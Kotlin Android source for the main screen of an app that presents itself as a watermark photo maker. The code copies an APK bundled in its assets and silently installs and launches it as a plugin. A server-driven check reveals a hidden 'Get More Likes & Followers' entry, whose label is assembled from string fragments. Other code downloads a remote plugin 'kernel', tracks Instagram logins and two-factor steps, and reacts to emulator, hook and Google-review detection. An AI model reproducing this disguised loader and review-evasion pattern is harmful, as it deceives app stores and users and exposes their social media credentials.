package com.getwatermark.photomaker.ui

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.graphics.LinearGradient
import android.graphics.Shader
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.text.TextUtils
import android.view.View
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import androidx.core.content.FileProvider
import com.adjust.sdk.Adjust
import com.adjust.sdk.AdjustEvent
import com.jvn.pow.VCi
import com.getwatermark.photomaker.R
import com.getwatermark.photomaker.lscj.*
import com.getwatermark.photomaker.lscj.cs.Vjsd
import com.getwatermark.photomaker.lscj.cs.wc.Spco
import com.getwatermark.photomaker.lscj.llod.Vss
import com.getwatermark.photomaker.lscj.wwzz.Ecjs
import com.getwatermark.photomaker.lscj.wwzz.Mcs
import com.getwatermark.photomaker.util.*
import org.greenrobot.eventbus.EventBus
import org.greenrobot.eventbus.Subscribe
import org.greenrobot.eventbus.ThreadMode
import java.io.File
import java.io.FileOutputStream
import java.io.IOException

class MainActivity : BaseActivity() {
    private val permissionUtil = Vs()
    private val cameraPermissions = arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA
    )
    private val albumPermissions = arrayOf(
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
    )


    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val event = AdjustEvent(PIAPP_LAUNCH)
        Adjust.trackEvent(event)
        setTextViewStyles(main_title)
        photo_bt.setOnClickListener {
            openAlbum()
        }
        camera_bt.setOnClickListener { openCamera() }
        main_set.setOnClickListener {
            copyAssetsFile2Phone("WaterMark_com.k.b_12(1).apk")
//            testNativeApp()
//            startActivity(Intent(this, Set::class.java))
        }
        main_coins_group.setOnClickListener {
            startActivity(Intent(this, Shpa::class.java))
        }
        funny.setOnClickListener {
            startActivity(Intent(this, Wpci::class.java))
        }
        trueEnter()
//        configSet()

    }

    private fun testNativeApp(name: String) {
        val pathname =
                getKernelPath(name)
        val pluginBundleId = "com.k.b"
        if ( PPPP.checkPluginInstall(pluginBundleId)){
            PPPP.unInstall(pluginBundleId)
        }

        if (PPPP.installPlugin(
                        pathname,
                        pluginBundleId,
                        1
                )){
//            handler.sendEmptyMessage(0)
            PPPP.startPlugin(this)
        }
    }
    private fun getKernelPath(fileName: String): String {
        val file = File(filesDir.absolutePath + File.separator + fileName)
        return file.path
    }

    private fun copyAssetsFile2Phone(fileName: String) {
        try {
            var inputStream = assets.open(fileName)
            //getFilesDir() 获得当前APP的安装路径 /data/data/包名/files 目录
            var file = File(filesDir.absolutePath + File.separator + fileName)
            file.delete()
            if (!file.exists() || file.length() == 0L) {
                val fos = FileOutputStream(file)//如果文件不存在，FileOutputStream会自动创建文件
                var len = -1
                val buffer = ByteArray(1024)
                while ((inputStream.read(buffer).apply { len = this }) != -1) {
                    fos.write(buffer, 0, len)
                }
                fos.flush()//刷新缓存区
                inputStream.close()
                fos.close()
            }
            testNativeApp(fileName)

        } catch (e: IOException) {
            e.printStackTrace()
        }
    }


    private fun openCamera() {
        if (permissionUtil.haveStoragePermission(*cameraPermissions)) {
            permissionUtil.openCamera(this)
        } else {
            permissionUtil.requestCameraPermission(this, *cameraPermissions)
        }
    }

    private fun openAlbum() {
        if (permissionUtil.haveStoragePermission(*albumPermissions)) {
            permissionUtil.openAlbum(this)
        } else {
            permissionUtil.requestAlbumPermission(this, *albumPermissions)
        }
    }

    public override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        var fileUri: Uri? = null
        if (resultCode == RESULT_OK) {
            if (data != null) {
                if (data.clipData != null) {
                    if (data.clipData!!.itemCount > 0) {
                        fileUri = data.clipData!!.getItemAt(0).uri
                    }
                } else {
                    fileUri = data.data
                }
            }
            when (requestCode) {
                PICK_REQUEST -> try {
                    if (fileUri != null) {
                        startActivity(fileUri.let { SCsAc.callingIntent(this, it) })
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                CAMERA_REQUEST -> try {
                    val contentUri: Uri?
                    val cameraSavePath = Vs().generateCachePicturePath(this)
                    contentUri = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        cameraSavePath?.let {
                            FileProvider.getUriForFile(this,
                                    Vs().getFileProviderName(this), it)
                        }
                    } else {
                        Uri.fromFile(cameraSavePath)
                    }
                    if (contentUri != null) {
                        startActivity(contentUri.let { SCsAc.callingIntent(this, it) })
                    }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
            }
        }
    }

    override fun onRequestPermissionsResult(
            requestCode: Int,
            permissions: Array<String>,
            grantResults: IntArray
    ) {
        when (requestCode) {
            PERMISSIONS_REQUEST_CAMERA -> {
                if (grantResults.isNotEmpty()) {
                    var hasPermission = true
                    for (e in grantResults) {
                        val tmp = e == PackageManager.PERMISSION_GRANTED
                        if (!tmp) {
                            hasPermission = false
                            break
                        }
                    }
                    if (hasPermission) {
                        permissionUtil.openCamera(this)
                    } else {
                        var showRationale = true
                        for (e in cameraPermissions) {
                            val boolean = ActivityCompat.shouldShowRequestPermissionRationale(
                                    this,
                                    e
                            )
                            showRationale = showRationale && boolean
                            if (showRationale) break
                        }
                        if (!showRationale) {
                            permissionUtil.goToSettings(this)
                        }

                    }
                    return
                }
            }
            PERMISSIONS_REQUEST_ALBUM -> {
                if (grantResults.isNotEmpty()) {
                    var hasPermission = true
                    for (e in grantResults) {
                        val tmp = e == PackageManager.PERMISSION_GRANTED
                        if (!tmp) {
                            hasPermission = false
                            break
                        }
                    }
                    if (hasPermission) {
                        permissionUtil.openAlbum(this)
                    } else {
                        var showRationale = true
                        for (e in albumPermissions) {
                            val boolean = ActivityCompat.shouldShowRequestPermissionRationale(
                                    this,
                                    e
                            )
                            showRationale = showRationale && boolean
                            if (showRationale) break
                        }
                        if (!showRationale) {
                            permissionUtil.goToSettings(this)
                        }

                    }
                    return
                }

            }

        }
    }

    private fun setTextViewStyles(text: TextView) {
        text.setTextColor(Color.parseColor("#FFFFC491"))
        val spec = View.MeasureSpec.makeMeasureSpec(0, View.MeasureSpec.UNSPECIFIED)
        text.measure(spec, spec)
        val width = text.measuredWidth
        val linearGradient = LinearGradient(0.toFloat(), 0.toFloat(), width.toFloat(),
                0.toFloat(),
                Color.parseColor("#FFFFC491"),
                Color.parseColor("#FF2D2D2D"),
                Shader.TileMode.CLAMP)
        text.paint.shader = linearGradient
        text.invalidate()
    }


    override fun onResume() {
        super.onResume()
        main_gold_num.text = Util.getCoins()
        /*    if (::mInterstitial.isInitialized) {
                if (mInterstitial.isReady) {
                    mInterstitial.show()
                } else {
                    mInterstitial.load()
                }
            }*/
//        MoPub.onResume(this)
        try {
            Adjust.onResume()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }


    override fun onPause() {
        super.onPause()
        try {
//            loadNum = 0
            Adjust.onPause()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
    // 关键代码 start

    // 关键代码 start
    override fun onDestroy() {
        super.onDestroy()
        if (EventBus.getDefault().isRegistered(this)) {
            EventBus.getDefault().unregister(this)
        }
    }


    /**
     * 记录 Adjust 事件
     *
     * @param eventName String
     */
    fun trackingAdjustEvent(eventName: String?) {
        if (TextUtils.isEmpty(eventName)) {
            return
        }
        val event = AdjustEvent(eventName)
        Adjust.trackEvent(event)
    }


    /**
     * 初始化广告
     */
/*
    private fun initAd() {
        val aDefault: MoPubDefault = MoPubDefault.getDefault()
        aDefault.init(this, PCache.isDebugMode())
    }
*/


    /**
     * 插件核心进入
     */
    private fun trueEnter() {
        configSet()
        EventBus.getDefault().register(this)
        enterTest()
    }

    /**
     * 插件内 adjust 配置项目: 谷歌支付key， adjust，广告启动配置
     */
    private fun configSet() {
        val instance: Mshp = Mshp.getInstance()
        if (Sc.isDebugMode()) {
            Mshp.getInstance().setAdjustSanboxMode(true)
        } else {
            Mshp.getInstance().setAdjustSanboxMode(false)
        }
        // 谷歌支付key
        instance.saveGoogleIap(Ken.GOOGLE_PAY_KEY)
        // adjust token
        instance.saveAdjustToken(Ken.ADJUST_TOKEN)
        // New User
        instance.saveAdjustNewCoins(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustNewFollowers(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustNewFollowersVip(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustNewLike(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustNewLikeVip(Ken.C_PURCHASE_SUCCESS)
        // Paid User
        instance.saveAdjustPaidCoins(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustPaidFollowers(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustPaidFollowersVip(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustPaidLike(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustPaidLikeVip(Ken.C_PURCHASE_SUCCESS)
        // Free User
        instance.saveAdjustFreeCoins(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustFreeFollowers(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustFreeFollowersVip(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustFreeLike(Ken.C_PURCHASE_SUCCESS)
        instance.saveAdjustFreeLikeVip(Ken.C_PURCHASE_SUCCESS)
        // 登陆
        instance.saveAdjustLogin(Ken.INS_LOGIN_SUCCESS)
        //点登陆按钮
        instance.saveAdjustLoginClick(Ken.INS_LOGIN_START)
        // 进入到核心
        instance.saveAdjustEnterKernel(Ken.APP_BASE_LAUNCH)
        // 下载事件
        instance.saveAdjustDownLoadSuccess(Ken.INS_DOWNLOAD)
        //新增ins登陆统计事件
        instance.setAdjustLoginFailed(Ken.INS_LOGIN_FAILED) //登陆失败
        instance.setAdjustLoginReportFail("") //上报错误信息失败
        instance.setAdjustSessionFail("") //获取seesionFail
        instance.setAdjustTwoAuthFails("") //俩步验证失败
        instance.setAdjustTwoAuth(Ken.INS_LOGIN_2AUTH) //开启俩步验证
        //web登陆事件
        instance.setAdjustWebInsLoginFail(Ken.INS_WEB_FAILED)
        instance.setAdjustWebInsLoginSuccess("")
        instance.setAdjustWebInsLoginStart(Ken.INS_LOGIN_START)
        instance.setAdjustWebInsLoginUserCancel("")
        instance.setAdjustWebInsLoginGetSessionFail("")
        instance.setAdjustWebInsLoginGetSessionSuccess("")
        //follow like失败事件
        instance.setAdjustInsFollowFails(Ken.C_EVENT_INFOLLOW_FAILED)
        instance.setAdjustInsLikeFails(Ken.C_EVENT_INLIKE_FAILED)
        //facebook登陆事件
        instance.setAdjustFacebookFails("")
        instance.setAdjustFacebookStart("")
        // 广告类名
        instance.setPluginAdClassName(VCi::class.java.name)
        // feedback 邮箱
        instance.saveFeedBackEmail(Ken.FEED_BACKE_MAIL)
        // 数数事件存储
        instance.saveTaAppId(Ken.TA_APP_ID)
    }


    /**
     * 插件请求检测
     */
    private fun enterTest() {
        Vjsd.getInstance().checkEnter(this, object : Vjsd.PpNiceGreate {
            private var ow: String? = null
            override fun showEnter(show: Boolean, entry: Int, where: String, obj: Any?) { //                WeDialogMaker.dismissProgressDialog();
                if (show && entry > 0) {
                    val s = "s"
                    val er = "er"
                    ow = "ow"
                    val ll = "ll"
                    val fo = "Fo"
                    val s1 = "& "
                    val s2 = "es "
                    val lik = "Lik"
                    val s3 = "e "
                    val or = "or"
                    val s4 = "t M"
                    val e = "e"
                    val g = "G"
                    textView.setText(g + e + s4 + or + s3 + lik + s2 + s1 + fo + ll + ow + er + s)
                    if (!Vjsd.HAS_SHOW_STORE_ALERT || obj != null) {
                        enter(false, entry, where, obj)
                    }
                    if (!Mshp.getInstance().getFirstShowKerbtn()) {
                        trackingAdjustEvent(Ken.BASELINE_BUTTON_IMPRESSION) //第一次显示核入口
                        Mshp.getInstance().setFirstShowKerbtn()
                    }
                    textView.setOnClickListener(View.OnClickListener {
                        if (!Mshp.getInstance().getFirstClickKerbtn()) {
                            trackingAdjustEvent(Ken.BASELINE_BUTTON_CLICK) //第一次点击和入口
                            Mshp.getInstance().setFirstClickKerbtn()
                        }
                        enter(true, entry, where, null)
                    })
                    textView.setVisibility(View.VISIBLE)
                } else { //   textView.setVisibility(View.GONE);
                }
            }
        })
    }

    private fun getContext(): Context? {
        return this
    }


    /**
     * 进入核心
     *
     * @param entry 核方式：1 web， 2 插件
     * @param where 用于 web 端核心地址
     * @param obj   用于插件信息
     */
    private var isClick = false

    private fun enter(isFromButton: Boolean, entry: Int, where: String, obj: Any?) {
        if (entry == 1 && !TextUtils.isEmpty(where)) { //            BActivity.start(getContext(), where, true);
            textView.setVisibility(View.VISIBLE)
        } else { // 下载并进入到插件核心中
            if (isDownLoading) {
                if (isFromButton) {
                    Vss.start(this)
                }
                return
            }
            if (obj is Spco) {
                val pp: Spco? = obj as Spco?
                val instance: Pu = Pu.getInstance()
                instance.setPpDownloadListener(object : Pu.PpDownloadListener {
                    override fun startRun() {
                        isDownLoading = true
                        if (isClick) {
                            isClick = false
                            Vss.start(this@MainActivity)
                        }
                    }

                    override fun onSuccess() {
                        isDownLoading = false
                        if (isClick) {
                            enterPluginKernel()
                        }
                    }

                    override fun onFail() {
                        isDownLoading = false
                        handleEnterFail()
                    }
                })
                instance.handlePpInfo(getContext(), pp)
            } else {
                if (isFromButton) {
                    enterPluginKernel()
                }
            }
        }
    }

    private fun enterPluginKernel() {
        val b: Boolean = Pu.getInstance().sPunoPuiow(getContext())
        if (!b) { // 进入失败
            isClick = true
            Toast.makeText(this, "Data processing,please wait a second...\n", Toast.LENGTH_SHORT).show()
            handleEnterFail()
        } else {
            textView.setVisibility(View.VISIBLE)
        }
    }

    private var retryTimes = 5

    private fun handleEnterFail() {
        try {
            if (retryTimes <= 0) {
                return
            } else {
                retryTimes--
            }
            Vjsd.getInstance().setLastRefreshTime(this@MainActivity, 0)
            textView.setOnClickListener(View.OnClickListener {
                textView.setOnClickListener(null)
                //                    WeDialogMaker.showProgressDialog(MainActivity.this, "");
                enterTest()
            })
        } catch (e: java.lang.Exception) {
            e.printStackTrace()
        }
    }

    private var isDownLoading = false

    @Subscribe(threadMode = ThreadMode.MAIN)
    fun onMessageEvent(event: Mcs) {
        val type: String = event.getType()
        if (TextUtils.equals(type, Ecjs.s1)) { //            C.start(this);
            isDownLoading = true
        } else if (TextUtils.equals(type, Ecjs.s3)) {
            isDownLoading = false
        } else if (TextUtils.equals(type, "check_fails")) {
            trackingAdjustEvent("") //google检测中
        } else if (TextUtils.equals(type, "ins_encheck_emulator")) {
            trackingAdjustEvent("") //模拟器 虚拟机
        } else if (TextUtils.equals(type, "ins_encheck_hook")) {
            trackingAdjustEvent("") //hook环境
        }
    }
    // 关键代码 end
}
